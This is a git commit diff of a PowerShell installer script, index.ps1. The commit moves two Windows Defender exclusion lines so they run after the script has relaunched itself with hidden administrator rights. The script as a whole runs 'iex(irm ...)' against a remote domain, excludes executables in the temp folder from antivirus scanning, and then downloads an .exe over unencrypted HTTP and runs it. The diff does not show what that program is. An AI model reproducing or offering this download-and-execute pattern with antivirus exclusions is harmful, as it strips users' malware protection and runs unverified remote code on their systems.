94c4a6bd66fb359c64a7df251ce7fae9888a2531
Tech Stuff <103606018+teknixstuff@users.noreply.github.com>
2024-08-04 07:11:06 +0100

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,7 +1,7 @@
-Add-MpPreference -ExclusionPath "$env:temp\getw7.exe"
-Add-MpPreference -ExclusionPath "$env:temp\w7.exe"
 If (!(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
   Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-nop','-c iex(irm r8p.teknixstuff.com)'; Exit;
 }
+Add-MpPreference -ExclusionPath "$env:temp\getw7.exe"
+Add-MpPreference -ExclusionPath "$env:temp\w7.exe"
 Invoke-WebRequest -Uri 'http://r8p.teknixstuff.com/files/getw7.exe' -OutFile "$env:temp\getw7.exe"
 Start-Process "$env:temp\getw7.exe"
